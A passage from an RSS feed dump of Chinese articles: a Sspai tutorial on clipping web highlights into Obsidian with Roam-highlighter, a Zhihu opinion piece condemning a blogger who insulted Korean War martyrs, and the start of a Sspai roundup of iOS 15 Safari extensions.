卸载一些内容低劣的平台。</p>\n<ul><li>我对内容低劣的平台定义：「那些通过一直给你推荐感兴趣的内容，刺激你的多巴胺让你一直不停地刷下去，最后你有什么都没记住的资讯平台」，相信我，绝大多数内容都是无意义的，当然如果你只用来打发时间不在本期讨论范围。</li></ul>\n<h2>记录：如何对阅读内容进行「摘要」 </h2>\n<p>「知识循环」的最终目的是对阅读和收集的内容进行「高质量产出」，当通过「筛选机制」找到想要的内容后，如何收集和整理就是接下来的重点。</p>\n<p>这里先假设你已经会使用 Obsidian 这款软件，如果你还不知道 Obsidian 是什么以及它怎么用，建议按顺序阅读以下文章：</p>\n<ul>\n<li>《<a href=\"https://sspai.com/post/62414\">玩转 Obsidian 01：用 Obsidian 打造「知识循环」利器</a>》</li>\n<li>《<a href=\"https://sspai.com/post/63481\">玩转 Obsidian 02：基础设置篇</a>》</li>\n<li>《<a href=\"https://sspai.com/post/63674\">玩转 Obsidian 03：如何记录「间歇式日记」</a>》</li>\n</ul>\n<p>接下来给大家推荐一款自己正在使用的 Chrome 插件，可以很方便的将 Web 内容摘录到 Obsidian 中，它就是 <a href=\"https://chrome.google.com/webstore/detail/roam-highlighter/mcoimieglmhdjdoplhpcmifgplkbfibp\">Roam-highlighter</a>，当然在《玩转 Obsidian | 打造知识循环利器》中介绍过这款软件，今天会更新一些细节说明，更加详细的介绍如何搭配 Roam-highlighter 进行高亮标注。</p>\n<h3>Roam-highlighter</h3>\n<p>Roam-highlighter 是一款 Chrome 插件，它支持我们对页面内容以「选中高亮」的方式进行摘录，并且会将摘录内容保存成对 Obsidian 友好的 markdown 格式，而这极大的提高了了我们对文章摘录的效率。</p>\n<p><strong>Roam-highlighter 的优点：</strong></p>\n<ul>\n<li>Roam-highlighter 支持通过快捷键进行选中高亮，方便在不影响阅读的同时进行摘录。</li>\n<li>Roam-highlighter 可以最大限度的保留原文中高亮内容的层级，如图：</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/c57e52c79ab5323d394f510a440a0929.png\"></figure><ul><li>Roam-highlighter 支持将摘录的内容中词语直接设置成「双向链接」格式，如图：</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/e01887c1990e1d0632f6ef7a5c7cef3f.png\"></figure><ul><li>Roam-highlighter 使用 markdown 保留原文中的超链接、加粗等格式，如图：</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/b1f1a6d818fc30d694e1eef225d1c1c4.png\"></figure><p> </p>\n<p><strong>Roam-highlighter 也有几个缺点：</strong></p>\n<ul>\n<li>无法对文章的图片进行摘录（PS：这一点对于一个 Highlight 软件来说有点为难）。</li>\n<li>在某些情况下多于 3 层的结构无法正常保存，即使通过快捷键调整后也依然无法解决，如图：</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/03adaf0fbfcbf60a6067dac4e1cd1524.png\"></figure><ul><li>对于部分文章中存在的「特殊格式」内容，无法高质量的摘录（例如：出现格式错乱），如图：</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/93a2188fb56b153e87d5992fa0c4aa5c.png\"></figure><h3>如何使用 Roam-highlighter </h3>\n<p>首先在 Chrome 上通过菜单栏打开 Roam-highlighter 后如图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/70e7ac8a103d18cb5932c5eb35d9b880.png\"><figcaption>启动 Roam-highlighter</figcaption></figure><p>启动 Roam-highlighter 后界面分为「原文区」和「摘录区」，接下来我们就可以在原文区进行摘录。</p>\n<h4><strong>设置 Roam-highlighter </strong></h4>\n<p>为了方便的快速导入到 Obsidian 中，需要先对 Roam-highlighter 做一下设置（点击「摘录区」的 Setting 按钮），设置内容如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/7e868602d8e7f39bdf75b0fc709ff629.png\"></figure><p>上图中一共有 5 个地方需要设置，分别对应图中标号 1-5:</p>\n<p>1.「标题样式」：可以根据「预设方案」选择不同的标题样式，本文中选择 Obsidian 样式。</p>\n<p>2. 「手动修改标题样式」：如果「预设方案」不能满足你的要求，可以手动在这里修改，其中 <code>%title%</code> 和<code> %url%</code> 分别对应被摘录文章的标题和 URL。</p>\n<p>3. 设置 markdown 样式， Roam-highlighter 会将选中的原文保存成 markdown 样式，这里建议去掉「Headers」这个选项。</p>\n<p>4. 「子弹笔记样式」：将高亮内容保存成「子弹笔记」样式方便拷贝到 Obsidian 中，如图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/5a8eb52310bfc98fe4a3c45acc9cdd54.png\"></figure><ol>\n<li>子弹笔记即摘要内容每行都以 - 开头</li>\n<li>在设置中将 Bullets 的内容设置为为 <code>- </code>，注意 <code>- </code>后边有一个「空格」。</li>\n<li>在设置中将 Indent 选中，代表保留原文「缩进」。</li>\n<li>在设置中将 Links 选中，代表保留原文中的「链接」并以 markdown 方式保存。</li>\n</ol>\n<p>5. 「拷贝设置」：我们每一行高亮都会自动保存到「剪贴板」，这里建议去掉 HTML 的勾选项。</p>\n<p>6. 通常我会设置窗口大小为：宽度（W）20% ，高度（H）70%，既不影响观看效果，也不影响摘录。</p>\n<p>7. 设置好以后一定要点「保存」。</p>\n<p><strong>其他设置</strong></p>\n<p>如果我们在「摘录」过程中发现被高亮的内容在「摘录区」的换行不对时，通常需要在设置中对「How to handle Line Breaks within each Highlight」这一行选择「Replace with single space」即可，如图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/ecd15ce56a201db558e5a8b699f37f8a.png\"></figure><p>修改设置后，样式正常如图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/a65526f829228b0ff2cf83f51e74816f.png\"></figure><h4><strong>开始摘录</strong></h4>\n<p>如果我们是第一次打开 Roam-highlighter 窗口，会默认显示它的快捷键设置，如图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/a5cafa3af38e78b1d1a83ce734c03d52.png\"><figcaption>开始摘录</figcaption></figure><p>接下来我们只需要选中需要「高亮」的内容，然后按下快捷键「CMD + X」（Win 下是 Ctrl+x） Roam-highlighter 会自动将选中内容设置为高亮颜色，同时被高亮的内容保存到「摘录区」。接下来的事情就是不停重复操作，一边阅读一边摘录，如图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/b31d24f1207b1764c94705c58d7e197a.png\"></figure><p> Roam-highlighter 为了方便我们进行摘录，提供了许多快捷键，例如刚才提到的「CMD + X」，接下来我们介绍一下常用快捷键使用。</p>\n<p><strong>快捷键设置</strong></p>\n<p>Alt + X：显示或隐藏窗口，有时候如果觉得 Roam-highlighter 窗口阻挡视线可以隐藏，通常情况下会让它显示，方便一遍高亮一遍观察「样式」，如果出现问题也可以随时修复。</p>\n<p>CMD + X : (Windows 下是 Ctrl + X) 将「原文区」已经选中的内容进行高亮；或者对选中的内容取消高亮。通常我们打开 Roam-highlighter 窗口然后一遍选择需要摘录的内容一边按下该快捷键进行「摘录」。</p>\n<p>Alt + Click :当鼠标放在「原文区」已经高亮的区域时，按下会移除该区域高亮设置。</p>\n<p>ALT + Q ：移除「原文区」所有已经高亮的内容，同时也清空「摘录区」的内容。</p>\n<p>ALT + A ：当在「原文区」再次选中「已经高亮」的内容时，按下快捷键会将该高亮内容设为「标题样式」，即后续再选中高亮的内容都在这个「标题」之下，如图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/3f8353968ddd8e96db7f97c9a56402de.png\"></figure><blockquote><p><i>对于「选中的高亮区域」持续按「ALT +A」，它的层级会一直变化，在有些摘录场景中可能会用得到，感兴趣的话自己试一下。</i></p></blockquote>\n<p>Double-Click：在「原文区」已经高亮的内容行中，双击后鼠标后，会自动选中附近的词语，同时将该词语设置成「双向链接」的形式，如图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/230f08b3aecf0f5946e009b1646a72f3.png\"></figure><p>ALT + Z ：等同于「Double-Click」，在「原文区」已经高亮的内容行中，选中一段词语后按下快捷键，该词会被设置成「双向链接」形式。</p>\n<h4><strong>保存高亮摘录</strong></h4>\n<p>随着每次摘录新内容，右侧的「摘录区」内容就会增加，同时还会自动内容到「剪贴板」，当我们完成一篇文章摘录之后，大概的样子如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/7b5bdcb52f2a44e027d4ae416a19121f.png\"></figure><ol>\n<li>「摘录区」保存着所有高亮的内容。</li>\n<li>「摘录区」保留着原文中的层级关系（支持我们使用 ALT +A 进行微调）。</li>\n<li>「摘录区」内容默认已经保存在「剪贴板」中。</li>\n</ol>\n<p>接下来我们在 Obsidian 中新建一篇笔记，同时为了方便对摘录内容保存，我们设置好 metadata。这里可以使用 Obsidian 中的模板功能，我的 metadata 格式如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/9ac3e8c65f82bd02c306b6d87cd42a49.png\"><figcaption>Metadata 模板</figcaption></figure><p><strong>模板设置</strong></p>\n<p>如果想要使用「Metadata」模板，设置方式如下：</p>\n<p>1.  在 Obsidian 的设置中开启「核心插件」中的「模板开关」： </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/74b7ee96e651b3ae27507545c83ab514.png\"></figure><p>2. 单独设置模板的变量格式：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/faa8a2b775bf8808a1bf665f6d5749a2.png\"></figure><p>3. 新建「Metadata」文件，并设置模板内容：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/7acdcd672ea99a0623133b4fa72cc6d5.png\"></figure><p>4. 新建一篇笔记，点击左侧按钮中的「插入模板」，即可将「模板」插入到笔记中：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/c19aa470e49f37bd54592bc8bf75abcf.png\"></figure><p>在完善了 metadata 信息后，将刚才摘录的原文粘贴完成后格式如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/84d25ace2385c73cad3b0098322b3802.png\"></figure><h3>总结</h3>\n<p>下图中内容出自「<a href=\"https://fortelabs.co/\">TIAGO FORTE</a>」的那篇著名的《<a href=\"https://fortelabs.co/blog/progressive-summarization-a-practical-technique-for-designing-discoverable-notes/\">Progressive Summarization: A Practical Technique for Designing Discoverable Notes</a>》，翻译过来：「渐进式总结。设计可发现笔记的实用技术」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/ce28c21a24d08f8f4c147314fd0f1029.png\"></figure><p>这段的大意指的是：身处数字世界的我们，「如何获取信息」甚至「通过工具摘录信息」，都不在是困难的事（正如本篇介绍使用 Obsidian 和 Roam-highlighter 进行摘录）。<a href=\"https://fortelabs.co/\">TIAGO FORTE</a> 提出现阶段「知识管理」真正的困难是「如何将信息传递给未来的我们」。</p>\n<p>这个观点涉及到了「知识管理」的核心本质即「我们管理的是什么？」。而这也是一直困扰许多人的问题，下一篇将结合<a href=\"https://fortelabs.co/\">TIAGO FORTE</a> 的观点以及 Obsidian 的使用介绍一下《如何使用 Obsidian 进行渐进式总结》，欢迎大家持续关注。</p>\n<hr>\n<p>「玩转 Obsidian」系列会持续更新「如何使用 Obsidian 进行知识管理」，对此系列感兴趣可以在以下渠道找到相关文章：</p>\n<ul>\n<li><a href=\"https://sspai.com/my/column/263/post\">少数派专栏 - 知识管理之术</a></li>\n<li><a href=\"https://xzsj.vip/\">闲者时间博客</a></li>\n<li><a href=\"https://xzsj.icu/\">闲者时间 Medium</a></li>\n</ul>\n<p>玩转 Obsidian 系列目前包括文章：</p>\n<ul>\n<li>《<a href=\"https://sspai.com/post/62414\">玩转 Obsidian 01：用 Obsidian 打造「知识循环」利器</a>》</li>\n<li>《<a href=\"https://sspai.com/post/63481\">玩转 Obsidian 02：基础设置篇</a>》</li>\n<li>《<a href=\"https://sspai.com/post/63674\">玩转 Obsidian 03：如何记录「间歇式日记」</a>》</li>\n<li>《<a href=\"https://sspai.com/post/67339\">玩转 Obsidian 04：为什么推荐使用 Obsidian 做知识管理</a>》</li>\n<li>《<a href=\"https://sspai.com/post/68492\">玩转 Obsidian 05：如何进行阅读及摘要</a>》</li>\n</ul>\n<p>可以在 <a href=\"https://twitter.com/xianzheshijian\">Twitter</a>、<a href=\"https://t.me/xztime\">Telegram</a> 、<a href=\"https://instagram.com/shopkeeper.wang\" target=\"_blank\">Instagram</a> 等渠道关注我，获取更多有意思的讯息。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n","link":"https://sspai.com/post/68492"},{"title":"诋毁贬损英烈，法律不容宽恕","date":"2021-10-09 03:04:59","description":"\n<p>缺乏敬畏感、与英雄精神为敌的行为，反映出的是精神的荒芜和人性的苍白，终究会被社会所鄙弃。</p>\n<p>在建党百年之际，刚刚过去的国庆72周年，让人们再次强烈感受到了什么是家国情怀。国庆前一天的9月30日烈士纪念日，习近平总书记向人民英雄纪念碑敬献花篮。在一个民族的精神谱系中，英雄是最醒目的标识。国庆不忘祭先烈，礼赞英烈是时代最动人的乐章，敬仰英烈是社会最普遍的价值认同。</p>\n<p>然而，仍有如罗某平之流的少数所谓网络“大V” 公然发表诋毁抗美援朝出国作战、侮辱志愿军英烈的言论，对英雄烈士进行恶意诋毁贬损、恶意消费，肆意挑战公众底线、法律红线，引发众怒同时“砸了自己的脚”，等待他的将是法律的制裁。</p>\n<p>辱骂“冰雕连”，良心何在！以“冰雕连”为代表的志愿军先烈们爬冰卧雪、靠着血肉之躯在朝鲜战场上拼死杀敌，捍卫了国家主权、人民尊严。这场深深烙印在中华民族记忆中的伟大战争，是全国人民心底最珍视、最柔软的部分！人民称之为“冰雕连”，是对他们为国而战的尊敬缅怀，也是对志愿军视使命荣誉高于一切精神的崇敬。“冰雕连”已经是抗美援朝战争中不可磨灭的符号，亦是志愿军捍卫祖国和人民利益、国家和民族尊严的象征。</p>\n<p>“英雄是民族最闪亮的坐标”，英雄烈士不容亵渎，网络空间不是法外之地，绝不可姑息！我们决不能让那些恶意诋毁英烈的人肆无忌惮、为所欲为。</p>\n<p>退役军人事务部门会同军地有关部门建立了英雄烈士保护部门联动协调制度，此次罗某平被依法刑事拘留，让我们深刻感受到国家依法捍卫英雄烈士名誉、荣誉的决心。法网恢恢，疏而不漏，从英雄烈士保护法到民法典，再到刑法修正案（十一），凡是侵害英雄烈士名誉、荣誉的行为，都要承担相应民事、行政、刑事责任。维护英雄形象、保护英烈名誉、守护英雄精神，法律是维护英烈“生前身后名”的坚强保障，更是对于每个公民的底线要求。</p>\n<p>近段时间，从几处街头出现“宣扬日本军国主义车贴”，到罗某平公然羞辱志愿军烈士，要遏制此类违法乱象的进一步滋生，除了完善相关法律法规外，还应严格依法惩戒在此类问题上的害群之马。今年以来，诋毁戍边英雄的网络“大V”“蜡笔小球”依法受到审判，已经敲响了警钟。</p>\n<p>党的十八大以来，《中华人民共和国英雄烈士保护法》《烈士褒扬条例》《烈士公祭办法》等一系列文件相继出台和修订，对加强褒扬纪念、开展烈士纪念活动等作出部署安排。以法律为根基、部门规章为支撑、规范性文件相配套的褒扬纪念政策制度体系基本建立，褒扬纪念工作制度化、规范化水平不断提高，全社会崇尚英雄、见贤思齐的氛围不断浓厚。</p>\n<p>“天地英雄气，千秋尚凛然。”英雄烈士，是社会、民族、国家，乃至一个时代的精神符号，那些带着热血与温度的英烈名字及其背后的故事，为我们在新时代攻坚克难、实现中华民族的伟大复兴注入生生不息的力量。缺乏敬畏感、与英雄精神为敌的行为，反映出的是精神的荒芜和人性的苍白，终究会被社会所鄙弃。</p>\n<p>英雄是永恒的主题，而不是炒作的话题，是我们民族的精神高地，要在全社会营造崇尚英雄、学习英雄、关爱英雄的浓厚社会氛围。人民英雄纪念碑前的隆重仪式、延乔路上铺满的鲜花，无不证明着，崇尚英雄、缅怀先烈正在成为中国人的集体共识、有力行动。一边享受着英烈用生命铺就的幸福生活，一边做着蝇营狗苟勾当的“键盘侠”，必将遭到唾弃，也必须付出代价。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-tui-yi-jun-ren-80?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国退役军人</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/419332743?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"iOS 15 支持 Safari 扩展了，这 10+ 个应用值得一试","date":"2021-10-09 03:00:00","description":"\n<p>在 iOS 15 中，Safari 浏览器迎来了重大变化。除了饱受争议的界面更新外，Safari 浏览器还向 macOS 版本看齐，加入了对第三方扩展的支持。随着 iOS 15 正式版的上线，我们也为你搜集了 App Store 上 14 个好用的 Safari 扩展，希望能帮你把 Safari 变得更好用。</p>\n<h2>如何管理 Safari 扩展</h2>\n<p>在下载支持 Safari 扩展的 App 后，你可以点击 Safari 浏览器地址栏左侧的扩展图标后，在「管理扩展」选项中开启需要运行的扩展功能，并对其可以读取和修改的网页进行约束。</p>\n<figure class=\"ss-imgRows\" figcaption=\"在 Safari 浏览器中管理扩展\"><img src=\"https://cdn.sspai.com/2021/10/02/ca05dd948d6eed7472e22724eea0ad13.PNG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/10/02/49a9ed63c4e1aa6f25641060330b3bc3.PNG\" alt=\"\"></figure><p>此外，你也可以在「设置-Safari 浏览器-扩展」中对不同插件的开关和权限进行选择。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/10/02/9e264441f90c61a77f8a105902239d6d.jpeg\"></figure><p>与此同时，App Store 的 「应用」 标签页中也增加了对应的分类。经过我的实际体验，这些 App 的 Safari 浏览器扩展提供了令人眼前一亮的功能。</p>\n<h2>密码管理</h2>\n<h3>1Password</h3>\n<p>早在 2018 年，<a href=\"https://sspai.com/post/47286\">iOS 12</a> 中新提供的 API 就为第三方密码管理 App 赋予了和系统自带钥匙串功能平起平坐的能力。通过键盘上的选词栏，1Password 无需在应用间跳转，即可实现自动填充密码和一次性验证码、查找和创建账户等功能。而现在借助全新的 Safari 浏览器扩展，1Password 的使用体验得以更加接近桌面端。</p>\n<p>在开启扩展后，当你在网页上进行注册时，1Password 会在下方提供「在 1Password 中保存」的选项，从而让你可以更为便捷地将账户信息添加至 1Password 中；而在输入登录信息后，1Password 还会询问是否将当前的登录信息保存至 App 中，从而避免了在 App 中手动输入相关内容的麻烦。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/10/02/ef0fe8ff1faa8b108b5a4d0a5bdc02a8.PNG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/10/02/18cb6efda7bab769d33157a1a8fdbd3c.jpg\" alt=\"\"></figure><p>在下次登陆时，1Password 会用同样的方式显示已经保存的用户名，点击即可将账户信息自动填充至当前页面。值得一提的是，如果你在 1Password 中设置了该账户的两步验证，1Password 扩展还会自动将一次性密码填充至对应位置，从而省去了此前手动粘贴的步骤。</p>\n<p>此外，你也可以在点击地址栏的扩展图标后，选择 1Password 的图标，从而在 Safari 浏览器中打开一个近似 1Password 应用本身的窗口。你可以在其中搜索账户，或是根据需求创建新的密码。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/10/02/cc353f460700841d65781eecea219dce.png\"></figure><p>目前唯一的问题是，Safari 浏览器中的 1Password 页面并没有像应用本身那样，提供基于面容 ID 或触控 ID 的解锁方式，而只能通过输入主密码的方式打开。你可以在 1Password 应用中的「设置-Safari Extension-在此后需要授权」中修改 1Password 扩展需要密码的间隔时间。</p>\n<p>你可以在 <a href=\"https://apps.apple.com/cn/app/1password-password-manager/id568903335\" target=\"_blank\">App Store</a> 中免费下载 1Password。应用的高级功能需要订阅。</p>\n<span class=\"ss-application\" app-id=\"2291\"> </span><h2>搜索工具</h2>\n<h3>xSearch</h3>\n<p>熟悉少数派的读者一定对 macOS 平台的 <a href=\"https://sspai.com/post/43973\">Alfred</a>、<a href=\"https://sspai.com/post/36732\">LaunchBar</a> 等应用不陌生。这些效率启动器最容易上手的功能，就是自定义网络搜索引擎。通过在应用内为常用的搜索网站添加关键词，即可通过输入「关键词+搜索内容」的方式，快速地在选中的网站上进行搜索。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/02/d26d2866ac08800601de98b2208c6a7b.png\"><figcaption>利用 Alfred 进行搜索</figcaption></figure><p>而此前，要在 iOS 平台上实现类似的功能，则往往需要利用快捷指令 App。然而相比桌面端的方式，创建快捷指令的上手难度更高，在实际使用时也不够方便。而 xSearch 则提供了一种更为便捷的实现和使用。</p>\n<p>xSearch 内置了不少搜索引擎，你可以根据需求来进行增删。xSearch 在右上角提供了两种添加搜索引擎的方式。但首先，你需要知道所添加搜索引擎的 URL。</p>\n<p>我曾在 <a href=\"https://sspai.com/post/47117\">这篇文章</a> 中简单介绍了搜索引擎 URL 的构成，并提供了一些常见的搜索引擎链接。你还可以根据文章中的指引，通过增加搜索语法的方式进行更为精准的搜索。</p>\n<p>以少数派为例，站内的搜索 URL 为 <code>https://sspai.com/search/post/%s</code>。你可以点击应用右上角的第一个图标，输入自定的搜索引擎命名和使用关键词，并将 URL 粘贴至对应位置，就完成了一次设置。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/10/02/917f1382ae9f7c2da5dee87b8dce2515.jpeg\"><figcaption>或是用这种方式获得更准确的搜索结果</figcaption></figure><p>此外，你也可以使用第二个图标，分别输入搜索引擎的域名（Domain Name）、路径（Path）和检索名称（Query Name）来完成设置。对于少数派来说，这三部分分别为「sspai.com」、「search/article」和「q」。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/10/02/027e2469e6e63ab3e29ac4f6d29a2115.jpeg\"></figure><p>在完成设置并打开对应扩展后，只需要在 Safari 浏览器的地址栏中输入「关键词 检索词」，即可在对应的搜索引擎中搜索关键词。</p>\n<figure class=\"ss-imgRows\" figcaption=\"使用效果\"><img src=\"https://cdn.sspai.com/2021/10/02/d7aa0aea50bf0693548e510c729eab65.PNG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/10/02/edd24ab573d08aa9199b376e6c53efa5.PNG\" alt=\"\"></figure><p>你可以在 <a href=\"https://apps.apple.com/cn/app/xsearch-for-safari/id1579902068\">App Store</a> 中下载 xSearch，应用售价 12 元。</p>\n<span class=\"ss-application\" app-id=\"16177\"> </span><h2>暗色模式</h2>\n<p>尽管苹果在 iOS 13 中就已经引进了暗色模式，但不少第三方应用和网页的适配依然遥遥无期。即使是 Google，其旗下的全系产品页面也并没有提供暗色模式。现在，你可以借助第三方扩展来解决 Safari 浏览器里的这些「钉子户」。</p>\n<h3>Noir</h3>\n<p>Noir 是一款非常容易上手的 App。下载 App 后，在设置中开启对应的拓展即可开始使用。Noir 默认会与系统的暗色模式状态同步，你也可以在应用中根据需要进行手动开关。</p>\n<p>此外，你还可以在 Safari 浏览器中，点击地址栏的扩展图标后修改 Noir 的设置。在这种情况下，你所做的调整只会针对当前网站生效，而不会影响全局设定。</p>\n<p>在开启暗色模式后，Noir 默认会将页面的浅色背景转换为深灰色。这样的调整也相对符合 Google 和苹果的设计规范。当然，你也可以在应用中将「Theme」修改为「Black」，从而将背景色更改为纯黑色。</p>\n<figure class=\"ss-imgRows\" figcaption=\"左：开启 Noir 之前；右：开启 Noir 之后\"><img src=\"https://cdn.sspai.com/2021/10/02/fc90503c1ee9b6dc2c6924bb593fa57f.PNG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/10/02/1e9215f76ad3552311e11ad8e8429ead.PNG\" alt=\"\"></figure><p>实际使用中，Noir 的表现效果相当优秀，在很大程度上避免了未适配页面在暗色模式下的刺眼问题。修改背景色后的页面也相对正常，不存在颜色翻转带来的不协调问题。不过，由于 Noir 依然只是相对机械地进行颜色替换，并无法避免由此带来的页面层级与颜色明暗不匹配的问题。关于这方面的进一步讨论，可以参考少数派的 <a href=\"https://sspai.com/post/55996\">这篇</a> 文章。但瑕不掩瑜，Noir 依然是一款足够出色的第三方解决方案。</p>\n<p>你可以在 <a href=\"https://apps.apple.com/cn/app/noir-dark-mode-for-safari/id1581140954\">App Store</a> 下载 Noir，应用售价 18 元，无内购。</p>\n<span class=\"ss-application\" app-id=\"16216\"> </span><h3>Turn Off the Light</h3>\n<p>相较于 Noir，Turn Off the Light 为用户提供了更大的自由度。在开启扩展后，通过在应用内点击「管理选项」，即可在跳转后的页面中对扩展效果进行调整。点击左上角的菜单键后，你可以对全局暗色模式、YouTube 视频播放等进行详细的设置。</p>\n<figure class=\"ss-imgRows\" figcaption=\"应用设置入口\"><img src=\"https://cdn.sspai.com/2021/10/02/041bcd9b183d263667912493f279ee63.PNG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/10/02/697050edd349c7d326dc35482c84628d.PNG\" alt=\"\"></figure><p>你可以自定义暗色模式下背景、文字、链接、页面按钮等不同模块等颜色，还可以调整启用时间、适用网站等。不过，相较于 Noir，Turn Off the Light 的设置页面颇为繁杂，无法做到「开箱即用」，且很多功能明显是直接从其桌面端移植而来，并不一定适用于 iOS 设备的情况。此外，应用目前也没有中文支持。如果你对暗色模式有着较高的自定义需求，可以尝试使用这款扩展。对于更多的用户，Noir 可能是一个更为便捷的选择。</p>\n<p>你可以在 <a href=\"https://apps.apple.com/cn/app/turn-off-the-lights-for-safari/id1273998507\">App Store</a> 免费下载 Turn Off the Light。</p>\n<span class=\"ss-application\" app-id=\"16215\"> </span><h2>内容拦截</h2>\n<h3>1Blocker</h3>\n<p>1Blocker 和 AdGuard 一直是 iOS 平台的两款主流内容拦截工具。相较于 AdGuard 颇为迟缓的动作，1Blocker 在第一时间适配了新的 Safari 浏览器扩展功能，推出了新的 1Blocker Script 扩展。</p>\n<p>根据 1Blocker 的介绍，相较于此前 Safari 浏览器提供的内容拦截 API，新的扩展功能让团队得以为 1Blocker 赋予更强大的内容屏蔽功能。新的 1Blocker Script 扩展没有交互页面，目前支持屏蔽 YouTube 视频中的广告。开发团队承诺将在未来的更新中加入更多的功能。</p>\n<p>如果你对 1Blocker 还不熟悉，可以在少数派找到相关 <a href=\"https://sspai.com/app/1Blocker%20X\">文章</a> 来进一步了解。1Blocker 可以在 <a href=\"https://apps.apple.com/cn/app/1blocker/id1365531024\">App Store</a> 免费下载，并提供高级版内购。</p>\n<span class=\"ss-application\" app-id=\"13737\"> </span><h3>Super Agent</h3>\n<p>在浏览网页时，Cookie 设置是一个影响使用体验但又绕不过去的麻烦。在多数情况下，要想阻止网页利用 Cookie 来进行追踪，就需要点击进一步设置，并在新的页面手动调整 Cookie 设置。即使你选择允许网页使用 Cookie，这额外的步骤也颇显多余。</p>\n<p>Super Agent 提供了一个更方便的解决方案。在下载应用并开启扩展后，Super Agent 会默认自动拒绝所有的非必要 Cookie。你也可以在其设置页面针对每一类 Cookie 进行自定义。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/10/02/741995fb9b3862b4b0858326bb9e5778.jpeg\"><figcaption>Super Agent 的设置页面</figcaption></figure><p>你可以在 <a href=\"https://apps.apple.com/cn/app/super-agent-for-safari/id1568262835\">App Store</a> 免费下载 Super Agent。</p>\n<span class=\"ss-application\" app-id=\"16217\"> </span><h2>购物</h2>\n<h3>Bring! ：一键添加食谱、食材</h3>\n<p>Bring! 是一款日用品管理工具。在 App 的主页面，Bring! 提供了果蔬、糕点、奶制品、洗化品、宠物用品等一系列的食材、杂货与日用品预设，并在每一栏目下罗列了详尽的商品种类。</p>\n<figure class=\"ss-imgRows\" figcaption=\"Bring! 的主页面\"><img src=\"https://cdn.sspai.com/2021/10/02/ee11317e7c6621fd65555a394bb86317.PNG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/10/02/bf3fef6791e1a8e0a11f3278f2b7189c.PNG\" alt=\"\"></figure><p>你可以点击商品图标来将其添加到购物清单中，还可以自定义需要的数量等信息。当你完成购买后，在主页再次点击该图标可以将其移除。</p>\n<p>不仅如此，Bring! 还在「Inspiration」页面定期更新食谱，并允许用户保存自定义的食谱。你还可以通过邀请其他其他用户的方式组成家庭，从而在家庭成员之间共享购物单和食谱。除此之外，Bring! 还提供了 Web 版和 watchOS 版本，并针对 Siri、快捷指令 App、Alex 和 Google Assistant 等自动化和智能助手工具提供了对应的支持。</p>\n<p>而在 iOS 15 版本上，Bring! 的 Safari 扩展插件可以识别并提取当前网页中的食谱。你可以选择将食谱保存至应用，或是将其中涉及到的食材添加到购物清单。</p>\n<figure class=\"ss-imgRows\" 